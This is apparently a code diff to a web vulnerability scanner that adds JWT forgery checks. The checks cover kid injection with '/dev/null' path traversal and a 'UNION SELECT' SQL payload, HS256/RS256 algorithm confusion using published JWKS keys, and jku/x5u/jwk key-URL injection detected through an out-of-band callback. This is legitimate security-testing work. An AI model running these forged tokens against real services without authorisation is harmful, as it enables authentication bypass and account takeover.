@@ -1,10 +1,17 @@
 package active
 
 import (
+	"bytes"
 	"context"
+	"crypto/hmac"
+	"crypto/rsa"
+	"crypto/sha256"
+	"crypto/x509"
 	"encoding/base64"
 	"encoding/json"
+	"math/big"
 	"strings"
+	"time"
 
 	"github.com/guaidao2/crackweb/internal/checks"
 	"github.com/guaidao2/crackweb/internal/finding"
@@ -79,19 +86,14 @@ func (jwt) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*find
 		forged := encodeJWTPart(forgedHeader) + "." + parts[1] + "."
 
 		mutated := t.Request.Clone()
-		mutated.Header.Set(field, strings.Replace(original, original, forged, 1))
+		mutated.Header.Set(field, replaceToken(t.Request.Header.Get(field), original, forged))
 		response, err := c.Do(ctx, mutated)
 		if err != nil || response == nil {
 			continue
 		}
-		// A rejection is correct behaviour, and the signature is doing its job.
-		if response.Status >= 400 {
-			continue
-		}
 		// The same request succeeded with a token nobody signed: the application
 		// is not verifying, and the credential means nothing.
-		if strings.Contains(strings.ToLower(string(response.Body)), "invalid") ||
-			strings.Contains(strings.ToLower(string(response.Body)), "unauthorized") {
+		if !jwtAccepted(response) {
 			continue
 		}
 
@@ -115,7 +117,434 @@ func (jwt) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*find
 		}
 		return []*finding.Finding{f}
 	}
+
+	// A token that is verified can still be forged through the field that names
+	// its key — see kidInjection.
+	if f := (jwt{}).kidInjection(ctx, c, t, field, original, parts, header); f != nil {
+		return []*finding.Finding{f}
+	}
+	// A token signed asymmetrically can also be forged with the public half of its own
+	// key — see jwtAlgorithmConfusion.
+	if f := jwtAlgorithmConfusion(ctx, c, t, field, original, parts, header); f != nil {
+		return []*finding.Finding{f}
+	}
+	// Last, because it needs an interaction server and proves a different thing: the
+	// verifier follows an address the token supplies.
+	if f := jwtKeyURL(ctx, c, t, field, original, parts, header); f != nil {
+		return []*finding.Finding{f}
+	}
 	return nil
+}
+
+// kidForgerySpellings are key identifiers that make a verifier read a key the
+// caller chooses. The identifier is not authenticated before it is used, so it
+// reaches a file open or a query — and both of those answer with something the
+// caller can predict.
+var kidForgerySpellings = []struct {
+	kid  string
+	key  []byte
+	note string
+}{
+	{"../../../../../../dev/null", nil,
+		"the identifier resolves to an empty file, so an empty key signs the token"},
+	{"/dev/null", nil,
+		"the null device, which is always empty"},
+	{"' UNION SELECT 'crackweb-kid-secret'-- -", []byte("crackweb-kid-secret"),
+		"the identifier is concatenated into a query that returns the key it names"},
+}
+
+// tamperSignature changes one character of a signature, which is enough to make
+// it invalid under any correct verifier.
+// tamperSignature returns a signature that differs from the one given, changed in the bytes
+// rather than in the text.
+//
+// Changing a character of the base64 is not enough. The last character of a signature carries
+// two padding bits, so replacing a final `A` with `B` decodes to the very same bytes: the
+// "forged" token is a valid one, the verifier accepts it, and a check that reads that as
+// "signatures are not verified" gives up on the target it was about to test. The first character
+// of the encoding carries six significant bits, and the bytes themselves always can be changed.
+func tamperSignature(signature string) string {
+	if signature == "" {
+		return "AAAA"
+	}
+	raw, err := base64.RawURLEncoding.DecodeString(signature)
+	if err != nil || len(raw) == 0 {
+		// Not a signature this can decode — change the first character, which never sits on a
+		// padding bit, so the text differs and so does what it stands for.
+		if signature[0] == 'A' {
+			return "B" + signature[1:]
+		}
+		return "A" + signature[1:]
+	}
+	forged := make([]byte, len(raw))
+	copy(forged, raw)
+	forged[0] ^= 0x01
+	return base64.RawURLEncoding.EncodeToString(forged)
+}
+
+// jwtAccepted reports whether the application treated the request as
+// authenticated: a success status and a body that does not say otherwise.
+func jwtAccepted(response *httpmsg.Response) bool {
+	if response == nil || response.Status >= 400 {
+		return false
+	}
+	lower := strings.ToLower(string(response.Body))
+	for _, word := range []string{"invalid", "unauthorized", "forbidden", "expired", "denied"} {
+		if strings.Contains(lower, word) {
+			return false
+		}
+	}
+	return true
+}
+
+// signJWT builds a token from a header and a payload, signed with HMAC-SHA256.
+func signJWT(header, payload map[string]any, key []byte) string {
+	signingInput := encodeJWTPart(header) + "." + encodeJWTPart(payload)
+	mac := hmac.New(sha256.New, key)
+	mac.Write([]byte(signingInput))
+	return signingInput + "." + base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
+}
+
+// kidInjection forges a token whose key identifier points at a key the caller
+// chose, and reports it when the application accepts the result.
+//
+// The guard matters as much as the attempt: a forged token proves nothing unless
+// the verifier rejects a signature that is simply wrong. Without that control, an
+// application which never checks signatures would look like one with a broken key
+// lookup — and that weakness is already reported, by the alg=none attempts above.
+func (jwt) kidInjection(ctx context.Context, c *checks.Context, t *checks.Target, field, original string, parts []string, header map[string]any) *finding.Finding {
+	payload, err := decodeJWTPart(parts[1])
+	if err != nil {
+		return nil
+	}
+	mutate := func(token string) (*httpmsg.Request, *httpmsg.Response) {
+		mutated := t.Request.Clone()
+		mutated.Header.Set(field, replaceToken(t.Request.Header.Get(field), original, token))
+		response, err := c.Do(ctx, mutated)
+		if err != nil {
+			return mutated, nil
+		}
+		return mutated, response
+	}
+
+	if _, control := mutate(parts[0] + "." + parts[1] + "." + tamperSignature(parts[2])); jwtAccepted(control) {
+		return nil
+	}
+
+	for _, spelling := range kidForgerySpellings {
+		forgedHeader := map[string]any{}
+		for k, v := range header {
+			forgedHeader[k] = v
+		}
+		forgedHeader["kid"] = spelling.kid
+		forged := signJWT(forgedHeader, payload, spelling.key)
+
+		mutated, response := mutate(forged)
+		if !jwtAccepted(response) {
+			continue
+		}
+		f := checks.NewFinding(jwt{}, t,
+			i18n.KeyCheckJWTTitle, i18n.KeyCheckJWTDesc, i18n.KeyCheckJWTFix)
+		f.Severity = finding.SeverityCritical
+		f.Confidence = finding.ConfidenceCertain
+		f.Method = mutated.Method
+		f.URL = mutated.URLString()
+		f.Payload = forged
+		f.CWE = "CWE-347"
+		f.References = []string{
+			"https://portswigger.net/web-security/jwt",
+			"https://cwe.mitre.org/data/definitions/347.html",
+		}
+		f.Evidence.Request = mutated.Raw()
+		f.Evidence.Response = truncate(response.Body, 8192)
+		f.Evidence.Baseline = truncate(t.Response.Body, 4096)
+		f.Evidence.Matches = []string{
+			field + ": kid=" + spelling.kid + " was accepted — " + spelling.note,
+			"a signature that is merely wrong was rejected, so the verifier does check signatures",
+		}
+		return f
+	}
+	return nil
+}
+
+// replaceToken returns a request header value with its token replaced and
+// everything else left alone — `Bearer ` above all.
+//
+// Rebuilding the value from the token alone drops the scheme, and a header the
+// server cannot parse is not a test of anything: such a request is refused for
+// its shape rather than for its signature, so every forgery would look rejected,
+// and the finding would silently never appear on the targets that use a scheme.
+func replaceToken(headerValue, original, forged string) string {
+	if index := strings.Index(headerValue, original); index >= 0 {
+		return headerValue[:index] + forged + headerValue[index+len(original):]
+	}
+	return forged
+}
+
+// jwtPublicKeyPaths are where a service that signs with a private key publishes the
+// matching public key. They are guesses, which is why the check tries several and is silent
+// when none answers.
+var jwtPublicKeyPaths = []string{
+	"/.well-known/jwks.json",
+	"/jwks.json",
+	"/.well-known/jwks",
+	"/jwt/jwks.json",
+	"/oauth/jwks.json",
+	"/publickey.pem",
+}
+
+// asymmetricAlgorithms are the JWT algorithms that sign with a private key and verify with a
+// public one — the family the confusion attack applies to.
+var asymmetricAlgorithms = map[string]bool{
+	"rs256": true, "rs384": true, "rs512": true,
+	"ps256": true, "ps384": true, "ps512": true,
+	"es256": true, "es384": true, "es512": true,
+}
+
+// jwtAlgorithmConfusion reports a service that verifies a token with the public key it
+// published.
+//
+// The attack is a substitution: the application signs asymmetrically, the verifier is asked
+// to check a token that claims HS256, and the key it reaches for is the public key the
+// service itself hands out. To the verifier the bytes are just bytes, so a token anyone can
+// forge is accepted as genuine. It is conclusive when it works — the forged token is signed
+// with a key the caller was given — and it needs the public key, which is why the check
+// looks for it where services publish it.
+func jwtAlgorithmConfusion(ctx context.Context, c *checks.Context, t *checks.Target, field, original string, parts []string, header map[string]any) *finding.Finding {
+	algorithm, _ := header["alg"].(string)
+	if !asymmetricAlgorithms[strings.ToLower(algorithm)] {
+		return nil
+	}
+	payload, err := decodeJWTPart(parts[1])
+	if err != nil {
+		return nil
+	}
+
+	// The same control the kid probe uses: a signature that is merely wrong has to be
+	// refused, or nothing was defeated and the header is simply not checked.
+	mutate := func(token string) (*httpmsg.Request, *httpmsg.Response) {
+		mutated := t.Request.Clone()
+		mutated.Header.Set(field, replaceToken(t.Request.Header.Get(field), original, token))
+		response, err := c.Do(ctx, mutated)
+		if err != nil {
+			return mutated, nil
+		}
+		return mutated, response
+	}
+	if _, control := mutate(parts[0] + "." + parts[1] + "." + tamperSignature(parts[2])); jwtAccepted(control) {
+		return nil
+	}
+
+	for _, path := range jwtPublicKeyPaths {
+		published, err := fetchPath(ctx, c, t, path)
+		if err != nil || published == nil || published.Status != 200 {
+			continue
+		}
+		for _, key := range publishedPublicKeys(published.Body) {
+			forgedHeader := map[string]any{}
+			for k, v := range header {
+				forgedHeader[k] = v
+			}
+			forgedHeader["alg"] = "HS256"
+			forged := signJWT(forgedHeader, payload, key)
+
+			mutated, response := mutate(forged)
+			if !jwtAccepted(response) {
+				continue
+			}
+
+			f := checks.NewFinding(jwt{}, t,
+				i18n.KeyCheckJWTTitle, i18n.KeyCheckJWTDesc, i18n.KeyCheckJWTFix)
+			f.Severity = finding.SeverityCritical
+			f.Confidence = finding.ConfidenceCertain
+			f.Method = mutated.Method
+			f.URL = mutated.URLString()
+			f.Payload = forged
+			f.CWE = "CWE-347"
+			f.References = []string{
+				"https://portswigger.net/web-security/jwt/algorithm-confusion",
+				"https://cwe.mitre.org/data/definitions/347.html",
+			}
+			f.Evidence.Request = mutated.Raw()
+			f.Evidence.Response = truncate(response.Body, 8192)
+			f.Evidence.Baseline = truncate(t.Response.Body, 4096)
+			f.Evidence.Matches = []string{
+				"the token was signed with the " + algorithm + "-family key the service publishes at " +
+					path + ", relabelled HS256, and it was accepted",
+				"the verifier uses the public key as an HMAC secret, so anyone who can read the " +
+					"public key can mint a token",
+			}
+			return f
+		}
+	}
+	return nil
+}
+
+// publishedPublicKeys returns the PEM blobs a key document carries: a JWKS converts its
+// numbers back into a key, and a document that simply holds PEM is used as it stands. Both
+// spellings are keys a verifier might have reached for.
+func publishedPublicKeys(body []byte) [][]byte {
+	var out [][]byte
+	trimmed := bytes.TrimSpace(body)
+
+	// A PEM document, with or without JSON around it.
+	if bytes.Contains(trimmed, []byte("-----BEGIN")) {
+		if start := bytes.Index(trimmed, []byte("-----BEGIN")); start >= 0 {
+			if end := bytes.Index(trimmed[start:], []byte("-----END")); end > 0 {
+				block := trimmed[start : start+end]
+				if marker := bytes.Index(block, []byte("-----\n")); marker > 0 {
+					end = marker + len("-----\n")
+				}
+				out = append(out, bytes.TrimSpace(block[:end+3]))
+			}
+		}
+	}
+
+	// A JWKS: each key becomes a PEM blob whose bytes are what a naive verifier would use.
+	var document struct {
+		Keys []struct {
+			Kty string `json:"kty"`
+			N   string `json:"n"`
+			E   string `json:"e"`
+		} `json:"keys"`
+		PEM string `json:"pem"`
+	}
+	if err := json.Unmarshal(trimmed, &document); err == nil {
+		if document.PEM != "" {
+			out = append(out, []byte(document.PEM))
+		}
+		for _, key := range document.Keys {
+			if !strings.EqualFold(key.Kty, "RSA") || key.N == "" || key.E == "" {
+				continue
+			}
+			modulus, err := base64.RawURLEncoding.DecodeString(key.N)
+			if err != nil {
+				continue
+			}
+			exponent, err := base64.RawURLEncoding.DecodeString(key.E)
+			if err != nil {
+				continue
+			}
+			number := 0
+			for _, b := range exponent {
+				number = number<<8 | int(b)
+			}
+			published := rsa.PublicKey{N: new(big.Int).SetBytes(modulus), E: number}
+			derived, err := x509.MarshalPKIXPublicKey(&published)
+			if err != nil {
+				continue
+			}
+			var document bytes.Buffer
+			document.WriteString("-----BEGIN PUBLIC KEY-----\n")
+			document.WriteString(base64.StdEncoding.EncodeToString(derived))
+			document.WriteString("\n-----END PUBLIC KEY-----\n")
+			out = append(out, document.Bytes())
+			// A verifier that was handed the DER rather than the PEM would use this.
+			out = append(out, derived)
+		}
+	}
+	return out
+}
+
+// jwtKeyFields are the JWT header fields that name where the verification key lives.
+var jwtKeyFields = []string{"jku", "x5u", "jwk"}
+
+// jwtKeyURL reports a verifier that followed a key address the token itself supplied.
+//
+// The field is the strongest thing a token header can ask for, because nothing the verifier
+// already trusts has signed it: point it at a host the caller controls and the verifier
+// fetches a document of the caller's choosing and, in the ordinary implementation, verifies
+// with the key it finds there. The callback is the proof, and it is a better one than a
+// forged token would be: it holds even when the token is then rejected, and it needs no
+// guess about the verifier's key handling.
+//
+// Three spellings of the algorithm are sent, because a verifier that checks the signature
+// before it looks at the header would otherwise never reach the fetch.
+func jwtKeyURL(ctx context.Context, c *checks.Context, t *checks.Target, field, original string, parts []string, header map[string]any) *finding.Finding {
+	if c.OOB == nil {
+		return nil
+	}
+	wait := c.OOBWait
+	if wait <= 0 {
+		wait = checks.OOBWait
+	}
+
+	var (
+		tokens   []string
+		requests []*httpmsg.Request
+		// keyField is kept outside the loop: the finding names the field that worked, and
+		// by then the loop variable is out of scope.
+		keyField string
+	)
+	for _, keyField = range jwtKeyFields {
+		callbackURL, token := c.OOB.NewURL("jwt")
+		tokens = append(tokens, token)
+
+		for _, spelling := range []struct {
+			algorithm any
+			signature string
+		}{
+			{header["alg"], parts[2]},
+			{"none", ""},
+			{"HS256", ""},
+		} {
+			forgedHeader := map[string]any{}
+			for k, v := range header {
+				forgedHeader[k] = v
+			}
+			forgedHeader[keyField] = callbackURL
+			forgedHeader["alg"] = spelling.algorithm
+
+			forged := encodeJWTPart(forgedHeader) + "." + parts[1] + "." + spelling.signature
+			mutated := t.Request.Clone()
+			mutated.Header.Set(field, replaceToken(t.Request.Header.Get(field), original, forged))
+			requests = append(requests, mutated)
+			if _, err := c.Do(ctx, mutated); err != nil {
+				continue
+			}
+		}
+	}
+
+	deadline := time.Now().Add(wait)
+	for {
+		for _, token := range tokens {
+			interactions := c.OOB.Poll(token)
+			if len(interactions) == 0 {
+				continue
+			}
+			f := checks.NewFinding(jwt{}, t,
+				i18n.KeyCheckJWTTitle, i18n.KeyCheckJWTDesc, i18n.KeyCheckJWTFix)
+			f.Severity = finding.SeverityHigh
+			f.Confidence = finding.ConfidenceCertain
+			f.Method = "GET"
+			f.URL = t.Request.URLString()
+			f.Payload = "jwt header key address (" + strings.Join(jwtKeyFields, "/") +
+				") pointing at the scanner's callback"
+			f.CWE = "CWE-347"
+			f.References = []string{
+				"https://portswigger.net/web-security/jwt",
+				"https://cwe.mitre.org/data/definitions/347.html",
+			}
+			f.Evidence.Request = requests[0].Raw()
+			f.Evidence.Response = []byte(c.Bundle.T(i18n.KeyEvidenceOOB,
+				"the header's key address", interactions[0].Detail, interactions[0].RemoteAddr))
+			f.Evidence.Matches = []string{
+				"the verifier fetched a key address the token itself named (" +
+					strings.Join(jwtKeyFields, "/") + "; " + keyField + " was the one seen first)",
+				"a key address in the token is chosen by whoever minted it, so a verifier that " +
+					"follows it can be made to fetch anything and to trust what it finds",
+			}
+			return f
+		}
+		if time.Now().After(deadline) {
+			return nil
+		}
+		select {
+		case <-time.After(250 * time.Millisecond):
+		case <-ctx.Done():
+			return nil
+		}
+	}
 }
 
 // findJWT returns the field a token was found in and the token itself.
